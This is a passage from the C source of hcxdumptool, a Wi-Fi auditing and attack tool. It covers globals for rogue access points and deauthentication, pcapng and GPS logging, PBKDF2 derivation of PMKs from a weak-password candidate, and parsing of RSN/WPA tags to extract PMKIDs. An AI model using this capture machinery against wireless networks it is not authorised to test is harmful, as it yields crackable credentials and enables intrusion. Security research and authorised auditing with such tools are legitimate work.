#define _GNU_SOURCE
#include <ctype.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdbool.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <limits.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <inttypes.h>
#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/filter.h>

#ifdef __ANDROID__
#include <libgen.h>
#define strdupa strdup
#include "include/android-ifaddrs/ifaddrs.h"
#include "include/android-ifaddrs/ifaddrs.c"
#else
#include <ifaddrs.h>
#endif

#include <net/if.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h> 
#include <netpacket/packet.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/cmac.h>

#include "include/hcxdumptool.h"
#include "include/rpigpio.h"
#include "include/wireless-lite.h"
#include "include/byteops.c"
#include "include/ieee80211.c"
#include "include/pcap.c"
#include "include/strings.c"
#include "include/hashops.c"
/*===========================================================================*/
/* global var */

static char *interfacename;
static char *pcapngoutname;
static char *gpsname;

static int fd_socket;
static int fd_gps;
static int fd_pcapng;
static int fd_socket_mccli;
static struct ip_mreq mcmreq;
static int fd_socket_mcsrv;
static struct sockaddr_in mcsrvaddress;

static FILE *fh_nmea;
static struct ifreq ifr_old;
static struct iwreq iwr_old;

static bool targetscanflag;
static bool totflag;
static bool poweroffflag;
static bool rebootflag;
static bool wantstopflag;
static bool beaconactiveflag;
static bool beaconfloodflag;
static bool gpsdflag;
static bool infinityflag;
static int sl;
static int errorcount;
static int maxerrorcount;
static int pmkidcount;
static int pmkidroguecount;
static int eapolmp12count;
static int eapolmp12roguecount;
static int eapolmp23count;
static int eapolmp34count;
static int eapolmp34zeroedcount;

static int gpscount;

static int gpiostatusled;
static int gpiobutton;

static struct timespec sleepled;
static struct timespec sleepled2;
static struct timeval tv;
static struct timeval tvold;
static struct timeval tvtot;
static uint8_t cpa;
static uint32_t staytime;
static uint16_t reasoncode;
static uint32_t attackcount;
static uint32_t attackstopcount;
static uint32_t attackresumecount;
static uint64_t timestamp;
static uint64_t timestampstart;
static uint64_t mytime;

static rth_t *rth;
static uint64_t incomingcount;
static uint64_t outgoingcount;

static uint32_t packetlenown;
static uint8_t *packetoutptr;

static uint8_t *packetptr;
static int packetlen;
static uint8_t *ieee82011ptr;
static uint32_t ieee82011len;
static uint8_t *llcptr;
static llc_t *llc;
static uint8_t *mpduptr;
static mpdu_t *mpdu;
static bool qosflag;

static int nmeatemplen;
static int nmealen;

static mac_t *macfrx;

static uint8_t *payloadptr;
static uint32_t payloadlen;

static maclist_t *filteraplist;
static maclist_t *filterclientlist;
static macessidlist_t *aplist;
static macessidlist_t *rglist;
static macessidlist_t *rgbeaconptr;
static macessidlist_t *rgbeaconlist;
static macessidlist_t *rgbeaconlistptr;

static ownlist_t *ownlist;
static pmklist_t *pmklist;

static pagidlist_t *pagidlist;
static scanlist_t *scanlist;

static int filteraplistentries;
static int filterclientlistentries;
static int filtermode;
static int myreactivebeaconsequence;

static struct sock_fprog bpf;

static int aktchannel;

static uint16_t myapsequence;
static uint16_t myclientsequence;

static uint16_t mydeauthenticationsequence;
static uint16_t mydisassociationsequence;

static uint16_t beaconextlistlen;
static uint64_t eapoltimeoutvalue;

static uint32_t statusout;
static uint32_t attackstatus;
static uint32_t pcapngframesout;
static enhanced_packet_block_t *epbhdr;
static enhanced_packet_block_t *epbhdrown;

static uint8_t weakcandidatelen;

static const uint8_t hdradiotap[] =
{
0x00, 0x00, /* radiotap version and padding */
0x0e, 0x00, /* radiotap header length */
0x06, 0x8c, 0x00, 0x00, /* bitmap */
0x02, /* flags */
0x02, /* rate */
0x14, /* tx power */
0x01, /* antenna */
0x08, 0x00 /* tx flags */
};
#define HDRRT_SIZE sizeof(hdradiotap)

const uint8_t channeldefaultlist[] =
{
1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 68,
96,
100, 102, 104, 106, 108, 110, 112, 114, 116, 118, 120, 122, 124, 126, 128,
132, 134, 136, 138, 140, 142, 144,
149, 151, 153, 155, 157, 159, 161,
161, 165, 169, 173,
0
};

const uint8_t channelscanlist1[] =
{
1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0
};

const uint8_t channelscanlist2[] =
{
36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
132, 136, 140, 149, 153, 157, 161, 165, 0
};

const uint8_t channelscanlist3[] =
{
1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13,
36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
132, 136, 140, 149, 153, 157, 161, 165, 0
};


static uint8_t channelscanlist[128] =
{
1, 6, 11, 3, 5, 1, 6, 11, 2, 4, 1, 6, 11, 7, 9, 1,
6, 11 ,8, 10, 1, 6, 11, 12, 13, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};

static uint8_t myessid[] = { "home" };

static uint32_t myoui_client;
static uint32_t myoui_ap;
static uint32_t mynic_ap;

static char drivername[34];
static char driverversion[34];
static char driverfwversion[ETHTOOL_FWVERS_LEN +2];

static uint8_t mac_orig[6];
static uint8_t mac_myclient[6];
static uint8_t mac_myprclient[6];
static uint8_t mac_myaphidden[6];
static uint8_t mac_myapopen[6];
static uint8_t mac_myap[6];

static uint64_t myrc;
static uint8_t myanonce[32];
static uint8_t mysnonce[32];

static char weakcandidate[64];

static uint8_t epb[PCAPNG_MAXSNAPLEN *2];
static uint8_t epbown[PCAPNG_MAXSNAPLEN *2];

static uint64_t lasttimestamp;
static uint8_t lastclient[6];
static uint8_t lastap[6];
static uint64_t lastrc;
static uint8_t lastkeyinfo;
static uint8_t lastkeyver;
static uint8_t lastanonce[32];
static uint8_t lastsnonce[32];

static uint64_t lastauthtimestamp;
static uint8_t lastauthclient[6];
static uint8_t lastauthap[6];
static uint8_t lastauthkeyver;

static char nmeatempsentence[NMEA_MAX];
static char nmeasentence[NMEA_MAX];

static char servermsg[SERVERMSG_MAX];
/*===========================================================================*/
/*===========================================================================*/
static inline void debugprint2(int len, uint8_t *ptr1, uint8_t *ptr2, char *mesg)
{
static int p;

fprintf(stdout, "\n%s ", mesg);
for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr1[p]);
	}
fprintf(stdout, " ");
for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr2[p]);
	}
fprintf(stdout, "\n");
return;
}
/*===========================================================================*/
static inline void debugprint(int len, uint8_t *ptr, char *mesg)
{
static int p;

fprintf(stdout, "%s ", mesg);
for(p = 0; p < len; p++)
	{
	fprintf(stdout, "%02x", ptr[p]);
	}
fprintf(stdout, "\n");
return;
}
/*===========================================================================*/
/*===========================================================================*/
__attribute__ ((noreturn))
static void globalclose()
{
static struct ifreq ifr;
static const char *gpsd_disable = "?WATCH={\"enable\":false}";

printf("\nterminating...\e[?25h\n");
sync();
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, "bye bye hcxdumptool clients...\n", sizeof ("bye bye hcxdumptool clients...\n"), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
if(gpiostatusled > 0)
	{
	GPIO_CLR = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_SET = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_CLR = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	GPIO_SET = 1 << gpiostatusled;
	nanosleep(&sleepled, NULL);
	}
if(fd_socket > 0)
	{
	if(bpf.filter != NULL)
		{
		if(setsockopt(fd_socket, SOL_SOCKET, SO_DETACH_FILTER, &bpf, sizeof(bpf)) < 0) perror("failed to free BPF code");
		}
	memset(&ifr, 0, sizeof(ifr));
	strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0) perror("failed to get interface information");
	ifr.ifr_flags = 0;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) perror("failed to set interface down");
	if(ioctl(fd_socket, SIOCSIWMODE, &iwr_old) < 0) perror("failed to restore old SIOCSIWMODE");
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr_old) < 0) perror("failed to restore old SIOCSIFFLAGS and to bring interface up");
	if(close(fd_socket) != 0) perror("failed to close raw socket");
	}
if(fd_gps > 0)
	{
	if(gpsdflag == true)
		{
		if(write(fd_gps, gpsd_disable, 23) != 23) perror("failed to terminate GPSD WATCH");
		}
	if(close(fd_gps) != 0) perror("failed to close GPS device");
	}
if(fd_socket_mccli > 0)
	{
	if(setsockopt(fd_socket_mccli, IPPROTO_IP, IP_DROP_MEMBERSHIP, &mcmreq, sizeof(mcmreq)) < 0) perror("failed to drop ip-membership");
	if(close(fd_socket_mccli) != 0) perror("failed to close client socket");
	}
if(fd_socket_mcsrv > 0)
	{
	if(close(fd_socket_mcsrv) != 0) perror("failed to close server socket");
	}
if(fd_pcapng > 0)
	{
	if(close(fd_pcapng) != 0) perror("failed to close PCAPNG dump file");
	}
if(fh_nmea != NULL)
	{
	if(fclose(fh_nmea) != 0) perror("failed to close NMEA 0183 dump file");
	}
if(filteraplist != NULL) free(filteraplist);
if(filterclientlist != NULL) free(filterclientlist);
if(aplist != NULL) free(aplist);
if(rglist != NULL) free(rglist);
if(rgbeaconlist != NULL) free(rgbeaconlist);
if(ownlist != NULL) free(ownlist);
if(pmklist != NULL) free(pmklist);
if(pagidlist != NULL) free(pagidlist);
if(scanlist != NULL) free(scanlist);
if(bpf.filter != NULL) free(bpf.filter);
if(poweroffflag == true)
	{
	if(system("poweroff") != 0)
		{
		printf("can't power off\n");
		exit(EXIT_FAILURE);
		}
	}
if(rebootflag == true)
	{
	if(system("reboot") != 0)
		{
		printf("can't reboot\n");
		exit(EXIT_FAILURE);
		}
	}
if(errorcount != 0) exit(EXIT_FAILURE);
if(totflag == true) exit(USER_EXIT_TOT);
exit(EXIT_SUCCESS);
}
/*===========================================================================*/
static inline void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL)) wantstopflag = true;
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void printtimestatus()
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d ERROR:%d INCOMING:%" PRIu64 " OUTGOING:%" PRIu64 " PMKIDROGUE:%d PMKID:%d M1M2ROGUE:%d M1M2:%d M2M3:%d M3M4:%d M3M4ZEROED:%d GPS:%d\n", timestring, channelscanlist[cpa],
		errorcount, incomingcount, outgoingcount, pmkidroguecount, pmkidcount, eapolmp12roguecount, eapolmp12count, eapolmp23count, eapolmp34count, eapolmp34zeroedcount, gpscount);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printposition()
{
static char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
snprintf(servermsg, SERVERMSG_MAX, "%s %3d INFO GPS:%s\n", timestring, channelscanlist[cpa], &nmeasentence[7]);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static inline void printstatusap(uint8_t *toaddr, macessidlist_t *zeiger, char *msg)
{
static int p, c;
static char timestring[16];
static char essidstring[ESSID_LEN_MAX *2 +1];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if((zeiger->essidlen == 0) || (zeiger->essid[0] == 0))
	{
	snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [HIDDEN %s]\n", timestring, channelscanlist[cpa],
		toaddr[0], toaddr[1], toaddr[2], toaddr[3], toaddr[4], toaddr[5],
		zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5], msg);
	if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
	else printf("%s", servermsg);
	return;
	}
p = 0;
for(c = 0; c < zeiger->essidlen; c++)
	{
	if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
	else if(zeiger->essid[c] == 0x5c)
		{
		essidstring[p++] = 0x5c;
		essidstring[p++] = 0x5c;
		}
	else essidstring[p++] = zeiger->essid[c];
	}
essidstring[p] = 0;
snprintf(servermsg, SERVERMSG_MAX, "%s %3d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s]\n", timestring, channelscanlist[cpa],
	toaddr[0], toaddr[1], toaddr[2], toaddr[3], toaddr[4], toaddr[5],
	zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5], essidstring, msg);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);
return;
}
/*===========================================================================*/
static void writegpwpl(uint8_t *mac)
{
static int c;
static int cs;
static char *gpwplptr;
static char gpwpl[NMEA_MAX];
static const char gpgga[] = "$GPGGA";
static const char gprmc[] = "$GPRMC";

if(nmealen < 30) return;
if(memcmp(&gpgga, &nmeasentence, 6) == 0) snprintf(gpwpl, NMEA_MAX-1, "$GPWPL,%.*s,%02x%02x%02x%02x%02x%02x*", 26, &nmeasentence[17], mac[0] , mac[1], mac[2], mac[3], mac[4], mac[5]);
else if(memcmp(&gprmc, &nmeasentence, 6) == 0) snprintf(gpwpl, NMEA_MAX-1, "$GPWPL,%.*s,%02x%02x%02x%02x%02x%02x*", 26, &nmeasentence[19], mac[0] , mac[1], mac[2], mac[3], mac[4], mac[5]);
else return;

gpwplptr = gpwpl+1;
c = 0;
cs = 0;
while(gpwplptr[c] != '*')
	{
	cs ^= gpwplptr[c];
	gpwplptr++;
	}
snprintf(gpwplptr +1, NMEA_MAX -44, "%02x", cs);
fprintf(fh_nmea, "%s\n", gpwpl);
return;
}
/*===========================================================================*/
static inline bool writecbnmea(int fd)
{
static int cblen;
static int written;
static custom_block_t *cbhdr;
static total_length_t *totallength;
static uint8_t cb[2048];

memset(&cb, 0, 2048);
cbhdr = (custom_block_t*)cb;
cblen = CB_SIZE;
cbhdr->block_type = CBID;
cbhdr->total_length = CB_SIZE;
memcpy(cbhdr->pen, &hcxmagic, 4);
memcpy(cbhdr->hcxm, &hcxmagic, 32);
cblen += addoption(cb +cblen, OPTIONCODE_NMEA, nmealen, nmeasentence);
cblen += addoption(cb +cblen, 0, 0, NULL);
totallength = (total_length_t*)(cb +cblen);
cblen += TOTAL_SIZE;
cbhdr->total_length = cblen;
totallength->total_length = cblen;
written = write(fd, &cb, cblen);
if(written != cblen) errorcount++;
return true;
}
/*===========================================================================*/
static inline void writeepbown(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdrown = (enhanced_packet_block_t*)epbown;
epblen = EPB_SIZE;
epbhdrown->block_type = EPBID;
epbhdrown->interface_id = 0;
epbhdrown->cap_len = packetlenown;
epbhdrown->org_len = packetlenown;
epbhdrown->timestamp_high = timestamp >> 32;
epbhdrown->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdrown->cap_len %4)) %4;
epblen += packetlenown;
memset(&epbown[epblen], 0, padding);
epblen += padding;
epblen += addoption(epbown +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epbown +epblen);
epblen += TOTAL_SIZE;
epbhdrown->total_length = epblen;
totallenght->total_length = epblen;
written = write(fd, &epbown, epblen);
if(written != epblen) errorcount++;
return;	
}
/*===========================================================================*/
static inline void writeepb(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packetlen;
epbhdr->org_len = packetlen;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdr->cap_len %4)) %4;
epblen += packetlen;
memset(&epb[epblen], 0, padding);
epblen += padding;
epblen += addoption(epb +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;
written = write(fd, &epb, epblen);
if(written != epblen) errorcount++;
return;	
}
/*===========================================================================*/
/*===========================================================================*/
static inline bool setclientfilter(ownlist_t *zeiger)
{
static maclist_t *zeigerfilter;

if(filtermode == FM_PROTECT)
	{
	for(zeigerfilter = filterclientlist; zeigerfilter < filterclientlist +filterclientlistentries; zeigerfilter++)
		{
		if(memcmp(zeiger->client, zeigerfilter->mac, 6) == 0)
			{
			zeiger->status |= FILTERED;
			return true;
			}
		}
	return false;
	}
if(filtermode == FI_ATTACK) 
	{
	for(zeigerfilter = filterclientlist; zeigerfilter < filterclientlist +filterclientlistentries; zeigerfilter++)
		{
		if(memcmp(zeiger->client, zeigerfilter->mac, 6) == 0) return false;
		}
	zeiger->status |= FILTERED;
	return true;
	}
return false;
}
/*===========================================================================*/
static inline bool setapfilter(macessidlist_t *zeiger)
{
static maclist_t *zeigerfilter;

if(filtermode == FM_PROTECT)
	{
	for(zeigerfilter = filteraplist; zeigerfilter < filteraplist +filteraplistentries; zeigerfilter++)
		{
		if(memcmp(zeiger->ap, zeigerfilter->mac, 6) == 0)
			{
			zeiger->status |= FILTERED;
			return true;
			}
		}
	return false;
	}
if(filtermode == FI_ATTACK) 
	{
	for(zeigerfilter = filteraplist; zeigerfilter < filteraplist +filteraplistentries; zeigerfilter++)
		{
		if(memcmp(zeiger->ap, zeigerfilter->mac, 6) == 0) return false;
		}
	zeiger->status |= FILTERED;
	return true;
	}
return false;
}
/*===========================================================================*/
static inline uint8_t *getpmk(uint8_t essidlen, uint8_t *essid)
{
static pmklist_t *zeiger;

for(zeiger = pmklist; zeiger < pmklist +PMKLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(zeiger->essidlen != essidlen) continue;
	if(memcmp(zeiger->essid, essid, essidlen) != 0) continue;
	zeiger->timestamp = timestamp;
	return zeiger->pmk;
	}
memset(zeiger, 0, PMKLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->essidlen = essidlen;
memcpy(zeiger->essid, essid, essidlen);
if(PKCS5_PBKDF2_HMAC_SHA1(weakcandidate, weakcandidatelen, essid, essidlen, 4096, 32, zeiger->pmk) == 0) return NULL;
qsort(pmklist, zeiger -pmklist +1, PMKLIST_SIZE, sort_pmklist_by_time);
return pmklist->pmk;
}
/*===========================================================================*/
static inline bool addownap(uint16_t status, uint8_t *ap)
{
static macessidlist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return false;
	if(memcmp(zeiger->ap, ap, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &status) >= AP_M2M3) return false;
	zeiger->status |= status;
	return true;
	}
return true;
}
/*===========================================================================*/
static inline bool addown(uint8_t status, uint8_t *client, uint8_t *ap)
{
static ownlist_t *zeiger;

for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, ap, 6) != 0) continue;
	if(memcmp(zeiger->client, client, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &status) == status) return false;
	zeiger->status |= status;
	return true;
	}
memset(zeiger, 0, OWNLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = status;
memcpy(zeiger->ap, ap, 6);
memcpy(zeiger->client, client, 6);
qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
return true;
}
/*===========================================================================*/
static inline void gettagwpa(int wpalen, uint8_t *ieptr, tags_t *zeiger)
{
static int c;
static wpaie_t *wpaptr;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;

wpaptr = (wpaie_t*)ieptr;
wpalen -= WPAIE_SIZE;
ieptr += WPAIE_SIZE;
if(memcmp(wpaptr->oui, &ouimscorp, 3) != 0) return;
if(wpaptr->ouitype != 1) return;
if(wpaptr->type != VT_WPA_IE) return;
zeiger->kdversion |= KV_WPAIE;
gsuiteptr = (suite_t*)ieptr;
if(memcmp(gsuiteptr->oui, &ouimscorp, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) zeiger->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) zeiger->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) zeiger->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) zeiger->groupcipher |= TCS_CCMP;
	if(gsuiteptr->type == CS_WEP104) zeiger->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) zeiger->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) zeiger->groupcipher |= TCS_NOT_ALLOWED;
	}
wpalen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < csuitecountptr->count; c++)
	{
	csuiteptr = (suite_t*)ieptr;
	if(memcmp(csuiteptr->oui, &ouimscorp, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) zeiger->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) zeiger->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) zeiger->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) zeiger->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) zeiger->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) zeiger->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) zeiger->cipher |= TCS_NOT_ALLOWED;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < asuitecountptr->count; c++)
	{
	asuiteptr = (suite_t*)ieptr;
	if(memcmp(asuiteptr->oui, &ouimscorp, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) zeiger->akm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) zeiger->akm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) zeiger->akm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) zeiger->akm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) zeiger->akm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) zeiger->akm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) zeiger->akm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) zeiger->akm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) zeiger->akm |= TAK_FT_SAE;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
return;
}
/*===========================================================================*/
static inline void gettagvendor(int vendorlen, uint8_t *ieptr, tags_t *zeiger)
{
static wpaie_t *wpaptr;

wpaptr = (wpaie_t*)ieptr;
if(memcmp(wpaptr->oui, &ouimscorp, 3) != 0) return;
if((wpaptr->ouitype == VT_WPA_IE) && (vendorlen >= WPAIE_LEN_MIN)) gettagwpa(vendorlen, ieptr, zeiger);
return;
}
/*===========================================================================*/
static inline void gettagrsn(int rsnlen, uint8_t *ieptr, tags_t *zeiger)
{
static int c;
static rsnie_t *rsnptr;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;
static rsnpmkidlist_t *rsnpmkidlistptr;

rsnptr = (rsnie_t*)ieptr;
if(rsnptr->version != 1) return;
zeiger->kdversion |= KV_RSNIE;
rsnlen -= RSNIE_SIZE;
ieptr += RSNIE_SIZE;
gsuiteptr = (suite_t*)ieptr;
if(memcmp(gsuiteptr->oui, &suiteoui, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) zeiger->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) zeiger->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) zeiger->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) zeiger->groupcipher |= TCS_CCMP;
	if(gsuiteptr->type == CS_WEP104) zeiger->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) zeiger->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) zeiger->groupcipher |= TCS_NOT_ALLOWED;
	}
rsnlen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < csuitecountptr->count; c++)
	{
	csuiteptr = (suite_t*)ieptr;
	if(memcmp(csuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) zeiger->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) zeiger->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) zeiger->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) zeiger->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) zeiger->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) zeiger->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) zeiger->cipher |= TCS_NOT_ALLOWED;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < asuitecountptr->count; c++)
	{
	asuiteptr = (suite_t*)ieptr;
	if(memcmp(asuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) zeiger->akm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) zeiger->akm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) zeiger->akm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) zeiger->akm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) zeiger->akm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) zeiger->akm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) zeiger->akm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) zeiger->akm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) zeiger->akm |= TAK_FT_SAE;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
rsnlen -= RSNCAPABILITIES_SIZE;
ieptr += RSNCAPABILITIES_SIZE;
if(rsnlen <= 0) return;
rsnpmkidlistptr = (rsnpmkidlist_t*)ieptr;
if(rsnpmkidlistptr->count == 0) return;
rsnlen -= RSNPMKIDLIST_SIZE;
ieptr += RSNPMKIDLIST_SIZE;
if(rsnlen < 16) return;
if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256)) memcpy(zeiger->pmkid, ieptr, 16);
return;
}
/*===========================================================================*/
static inline void gettags(int infolen, uint8_t *infoptr, tags_t *zeiger)
{
static ietag_t *tagptr;

